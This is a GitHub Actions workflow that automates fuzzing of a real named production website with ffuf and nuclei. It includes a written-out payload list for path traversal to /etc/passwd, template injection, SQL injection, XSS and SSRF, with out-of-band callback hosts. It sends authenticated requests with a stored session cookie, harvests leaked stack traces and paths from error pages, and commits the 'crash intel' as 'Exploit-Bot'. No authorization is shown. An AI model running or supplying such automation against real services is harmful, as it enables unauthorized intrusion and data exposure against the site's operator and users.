name: "Heavy-Duty Crash Escalation ‚Äî FIXED"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

env:
  TARGET_URL: "https://academy.openai.com/?amp=test"
  FUZZ_BASE: "https://academy.openai.com/?amp="

jobs:
  escalate_500:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Tools
        run: |
          go install github.com/ffuf/ffuf/v2@latest
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: üõ†Ô∏è Setup Fresh Templates
        run: nuclei -ut # Critical: Downloads latest template paths

      - name: üìù Generate Robust Payloads
        run: |
          # Create a real, local wordlist for FFUF
          cat <<EOF > payloads.txt
          %00
          ../../../../etc/passwd
          {{7*7}}
          \${7*7}
          [object%20Object]
          undefined
          NaN
          ' OR 1=1--
          " OR 1=1--
          <script>alert(1)</script>
          http://127.0.0.1
          http://oast.pro
          EOF
          echo "Payloads created: $(wc -l < payloads.txt)"

      - name: ‚ò¢Ô∏è Test 1:Advanced SSRF & OAST
        run: |
          # Using the correct 2026 tag for SSRF fuzzing
          nuclei -u "${{ env.FUZZ_BASE }}test" \
            -tags ssrf,oast,fuzz \
            -interactsh-server oast.fun \
            -o ssrf_results.txt || true

      - name: üéØ Test 2:FFUF Escalation (Verified)
        run: |
          # Added -v (verbose) to see why it crashed
          ffuf -u "${{ env.FUZZ_BASE }}FUZZ" \
               -w payloads.txt \
               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" \
               -mc 500 -v -o crash_matrix.json

      - name: üïµÔ∏è Test 3:Verbose Error Capture
        run: |
          # Save the full body of the 500 error to see if code leaks
          curl -s -D headers.txt "${{ env.TARGET_URL }}" \
               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > response_body.html
          
          # Scan the response for internal paths or software versions
          grep -iE "stack|at |line |/home/|/var/|node_modules|python|version" response_body.html > findings.txt || true

      - name: üö® Alert & Save
        if: always()
        run: |
          if [ -s findings.txt ] || [ -s ssrf_results.txt ]; then
            REPORT="### üö® CRASH ANALYSIS\n"
            [ -s findings.txt ] && REPORT+="\n#### Leaked Data:\n\`\`\`\n$(cat findings.txt | head -n 10)\n\`\`\`"
            
            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
              -H "Content-Type: application/json" \
              https://api.github.com/repos/${{ github.repository }}/issues \
              -d "{\"title\":\"üö® POTENTIAL EXPLOIT: amp 500\",\"body\":\"$REPORT\"}"
          fi
          
          # Save results to repo
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          git add .
          git commit -m "Updated Crash Intel" || true
          git push origin main || true
          
